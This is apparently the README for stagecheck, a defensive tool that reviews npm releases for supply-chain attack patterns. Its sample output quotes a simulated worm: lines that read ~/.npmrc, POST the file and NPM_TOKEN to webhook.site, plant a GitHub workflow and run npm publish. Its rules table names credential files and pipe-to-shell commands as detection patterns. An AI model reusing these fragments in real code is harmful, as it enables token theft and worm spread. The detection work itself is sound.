# stagecheck

**Look before you approve.** stagecheck reviews an npm release before it goes live: it diffs the new tarball against the last published version and flags the changes that supply-chain attacks rely on, such as new install scripts, credential access, exfiltration endpoints, workflow planting, self-publishing code and obfuscation.

[![npm](https://img.shields.io/npm/v/stagecheck)](https://www.npmjs.com/package/stagecheck)
[![CI](https://github.com/daniel63194/stagecheck/actions/workflows/ci.yml/badge.svg)](https://github.com/daniel63194/stagecheck/actions/workflows/ci.yml)
[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/daniel63194/stagecheck/badge)](https://scorecard.dev/viewer/?uri=github.com/daniel63194/stagecheck)

```console
$ npx stagecheck
1 staged release waiting for approval.

color-utils 2.3.0 → 2.3.1  staged by ci-bot (token)
  files: 1 added, 1 modified, 0 removed · size 271 B → 709 B (+162%)

  HIGH   package.json adds a "postinstall" script, which runs automatically on install
         node bundle.js
  HIGH   bundle.js reads credentials or credential files (×2)
         const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
  HIGH   bundle.js contacts a service commonly used to exfiltrate data
         fetch('https://webhook.site/6f1c2a', { method: 'POST', body: JSON.stringify({ npmrc, env: process.env.NPM_TOKEN }) });
  HIGH   bundle.js references GitHub Actions workflow files (worms such as Shai-Hulud plant workflows)
         fs.writeFileSync('.github/workflows/shai-hulud.yml', workflow);
  HIGH   bundle.js runs npm account or publish commands from shipped code (self-propagating worms do this)
         execSync('npm publish --access public');
  MEDIUM staged by ci-bot (token), but the previous version was published by alice
  MEDIUM bundle.js starts other programs (×2)
         const { execSync } = require('child_process');
  low    contacts 1 domain not referenced by the previous version
         webhook.site

  5 high-risk findings: review carefully before approving.

color-utils@2.3.1: [a]pprove, [r]eject, [s]kip, [q]uit? (s) r
```

*(A simulated worm release. For an ordinary release, stagecheck prints `✓ No red flags found.`)*

- **Zero dependencies.** A security tool should not add to your supply chain. Only Node.js and npm.
- **Diff-based, so it stays quiet.** It reports what a release *introduces*. If your package has always spawned processes, that is not news; a utility library that suddenly starts reading `~/.npmrc` is.
- **Works on any package.** Review a dependency update before you install it: `npx stagecheck review axios@1.13.2`.
- **Fast.** It reads tarballs in memory and never runs package code. A typical review takes about a second.

## Why

In 2025, worms such as [Shai-Hulud](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) spread across hundreds of npm packages by stealing maintainers' tokens and publishing poisoned versions. The poisoned releases followed a recognisable pattern: a new install script, code that hunts for `.npmrc` and cloud credentials, uploads to an attacker's endpoint, a planted GitHub workflow, and a publish step that infects the victim's other packages.

npm's answer is [**staged publishing**](https://docs.npmjs.com/staged-publishing): CI uploads a release with `npm stage publish`, and nothing goes live until a maintainer approves it with 2FA. A stolen CI token can no longer ship a release on its own.

A human checkpoint only helps if the human knows what changed, though. npm lets you download a staged tarball or look at it on the website, but it doesn't tell you what differs from the current release or which of those changes are risky. stagecheck is that review step: it compares the staged version with the version already on npm and puts the risky parts first.

## Quick start

Requires Node.js 20.19+. The staging commands need npm 11.15+ (`npm install -g npm@latest`), which npm supports on Node.js 22.14+.

```sh
# Review your staged releases one by one, then approve, reject or skip each.
npx stagecheck

# List staged releases without reviewing them.
npx stagecheck list

# Compare any published version with the one before it.
npx stagecheck review express@5.1.0

# Compare two versions, or local tarballs from `npm pack`.
npx stagecheck review lodash@4.17.20 lodash@4.17.21
npx stagecheck review my-lib-1.0.0.tgz my-lib-1.1.0.tgz

# Review the package in the current directory against what is on npm (for CI).
npx stagecheck ci
```

Approving or rejecting goes through npm, so npm asks for your 2FA code as usual. If a release has high-risk findings, stagecheck also makes you type the package name before approving it. Rejecting asks for confirmation, because it deletes the staged version.

## Use it in CI

### Recommended: stage from CI, approve from your machine

This workflow reviews every tagged release, stages it if the review passes, and leaves the final decision to a maintainer. Configure the workflow as a [trusted publisher](https://docs.npmjs.com/trusted-publishers) on npmjs.com so no npm token is stored in GitHub.

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ['v*']

permissions:
  contents: read

jobs:
  stage:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write # trusted publishing and provenance
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - run: npm ci && npm test
      - uses: daniel63194/stagecheck@v0.1.0
        with:
          stage-publish: true
          publish-args: --provenance --access public
```

The job summary shows the review and the command to approve the release. Then, on your machine:

```sh
npx stagecheck
```

If the review finds a high-severity issue, the release is **not** staged and the job fails.

### Review pull requests

Run the same review on every pull request to see what the next release will change, including new dependencies and scripts, before anything is tagged:

```yaml
- uses: daniel63194/stagecheck@v0.1.0
  with:
    fail-on: high # or medium, low, none
```

### Action inputs and outputs

| Input | Default | Description |
| --- | --- | --- |
| `fail-on` | `high` | Fail when a finding has this severity or higher: `high`, `medium`, `low` or `none`. |
| `stage-publish` | `false` | Stage the reviewed tarball with `npm stage publish` if the review passes. Installs npm 11.15+ if needed. |
| `publish-args` | | Extra arguments for `npm stage publish`, such as `--provenance --access public`. |
| `tag` | | Dist-tag to compare against. Defaults to `publishConfig.tag`, then `latest`. |
| `working-directory` | `.` | Directory that contains the `package.json`. |
| `version` | the action's version | stagecheck version to run. |

Outputs: `high`, `medium`, `low` (finding counts), `name`, `version` and `stage-id`.

Not on GitHub? `npx stagecheck ci` works in any CI. It writes a Markdown report to `--summary <file>` (or `$GITHUB_STEP_SUMMARY`), and `--stage-publish` stages the tarball it reviewed. Arguments after `--` go to `npm stage publish`:

```sh
npx stagecheck ci --stage-publish -- --provenance --access public
```

The tarball that gets staged is the exact file that was reviewed. It is not packed a second time.

## What it checks

stagecheck never runs package code. It reads both tarballs, diffs `package.json` and every file, and applies these rules to what changed.

| Severity | Rule | Flags |
| --- | --- | --- |
| high | `install-script` | A `preinstall`, `install` or `postinstall` script was added or changed. These run on every `npm install`. |
| high | `dependency-source` | A dependency now installs from git, a URL, a local path or a GitHub shorthand instead of the registry. |
| high | `credential-access` | New code reads npm, cloud or CI tokens, or files such as `.npmrc`, `~/.ssh/id_*` and `~/.aws/credentials`, or dumps `process.env`. |
| high | `exfiltration-endpoint` | New code contacts services often used to receive stolen data, such as webhook.site, Pipedream, ngrok, Discord or Telegram webhooks, or interactsh. |
| high | `workflow-write` | New code references `.github/workflows`. |
| high | `self-publish` | Shipped code runs `npm publish`, `npm whoami`, `npm token create` or calls the matching registry APIs. |
| high | `pipe-to-shell` | Code downloads and runs a script: `curl … \| sh`, `iex`, `powershell -enc`. |
| high | `obfuscation` | The package gained many obfuscator-style identifiers (`_0x1a2b`) or hex escapes. |
| high | `sensitive-file` | A `.env`, `.npmrc`, private key or similar file is now published. |
| high | `binary-executable` | A compiled executable or native module (ELF, Mach-O, PE, `.node`) appeared in a package that never shipped one. |
| high | `manifest` | `package.json` is missing or invalid. |
| medium | `install-script-target` | A file that an existing install script runs has changed. |
| medium | `native-build` | `binding.gyp` was added, so npm will compile native code on install. |
| medium | `dependency-added` | New `dependencies` or `optionalDependencies`. |
| medium | `dependency-alias` | A dependency is an `npm:` alias for a different package. |
| medium | `bin-change` | Commands installed on users' `PATH` were added or changed. |
| medium | `publisher-change` | The release was staged by a different account than the one that published the previous version. |
| medium | `child-process`, `dynamic-code`, `github-token`, `base64-blob` | The package starts processes, evaluates code built at runtime (`eval`, `new Function`, `vm`), reads a GitHub token, or embeds a large base64 string, **for the first time**. |
| medium | `binary-executable` | A compiled executable was added or changed in a package that already ships them. stagecheck can't look inside binaries, so check that they came from your build. |
| medium | `binary-wasm` | A WebAssembly module appeared in a package that never shipped one. |
| medium | `minified-injection` | A readable file gained a very long line, a common way to hide an injected payload. |
| medium | `new-minified-file` | Minified code appeared in a package that never shipped any. |
| medium | `size-jump` | The unpacked size more than doubled, by over 500 kB. |
| low | `dependency-added` | New `peerDependencies`. |
| low | `entry-points` | `main`, `exports`, `module`, `browser`, `types` or `imports` changed. |
| low | `version-order` | The version is not newer than the one it is compared with. |
| low | `binary-wasm` | A WebAssembly module was added or changed in a package that already ships them. |
| low | `new-domains` | Code references domains the previous version never mentioned. |

### Keeping noise down

A review is only useful if people read it, so stagecheck tries hard not to cry wolf:

- Content rules look only at lines a release **adds**, and only in code files. TypeScript declaration files are skipped because they never run.
- A medium-severity capability, such as starting processes, is reported only if the previous version **never** had it anywhere in the package. Moving or re-bundling existing code does not trigger it.
- A high-severity pattern is reported only if it now appears on **more** lines across the package than before. Obfuscation counts only net growth, so a regenerated parser full of escaped strings stays quiet.
- Packages that ship binaries rebuild them every release, so a changed binary is high severity only in a package that never had one.
- A first release has nothing to compare with, so every rule applies to every file. Expect more findings, and read them.

If a finding is expected, for example because your package legitimately reads `NPM_TOKEN`, leave it out with `--ignore`:

```sh
npx stagecheck ci --ignore credential-access:dist/publish.js --ignore new-domains
```

An entry is a rule id, optionally followed by `:` and a path glob (`*` matches within a folder, `**` across folders). The report says how many findings were ignored. Prefer narrow, path-scoped entries, so an ignore cannot hide the same pattern appearing somewhere new.

## Options

```
--format <text|markdown|json>     Output format (default: text)
--fail-on <high|medium|low|none>  Exit with code 1 at this severity (default: none; ci: high)
--tag <tag>                       Dist-tag to compare against (default: latest)
--ignore <rule[:path]>            Leave out a rule, optionally only for matching files; repeatable
--verbose                         List every changed file
--no-color                        Plain output (NO_COLOR is respected too)

ci only:
--stage-publish                   Stage the reviewed tarball if the review passes
--summary <file>                  Also write the Markdown report to this file
```

Exit codes: `0` success, `1` a finding at or above `--fail-on`, `2` usage or npm error.

`stagecheck` with no command compares each staged version with the version behind its dist-tag. If that version is newer, as with a backport, it compares with the nearest lower published version. In a non-interactive shell, or with `--format json` or `--format markdown`, it prints the reviews and does not prompt.

## Library

```js
import { reviewTarballs, renderText } from 'stagecheck';
import { readFileSync } from 'node:fs';

const review = reviewTarballs(readFileSync('old.tgz'), readFileSync('new.tgz'));
console.log(renderText(review));
if (review.counts.high > 0) process.exit(1);
```

`reviewTarballs(before, after, options)` takes `.tgz` bytes (`before` may be `null` for a first release). `reviewFiles` takes file maps, and `readTarball`, `diffManifests`, `runRules`, `renderMarkdown` and `renderJson` are exported too. Everything is typed.

## Limitations

stagecheck is a reviewing aid, not a malware scanner. It uses heuristics on the diff, so a determined attacker who knows the rules can write code that avoids them, for example by building strings at runtime. It does not execute code, follow dependencies or check package reputation. It catches the common, noisy patterns that real worms have used, and it makes the change set small enough for a human to actually read. Use it alongside, not instead of, 2FA, trusted publishing, provenance and lockfiles.

For consumers, tools such as [GuardDog](https://github.com/DataDog/guarddog) or [Socket](https://socket.dev) scan packages and their dependency trees. `npm diff` shows a raw diff without any analysis. stagecheck focuses on the publisher's moment of decision: is this exact tarball what I meant to release?

## Contributing

Found a false positive, or a real attack that slipped through? Please [open an issue](https://github.com/daniel63194/stagecheck/issues/new/choose). Both make the rules better. See [CONTRIBUTING.md](CONTRIBUTING.md) for how rules are added and tested.

## License

[MIT](LICENSE)
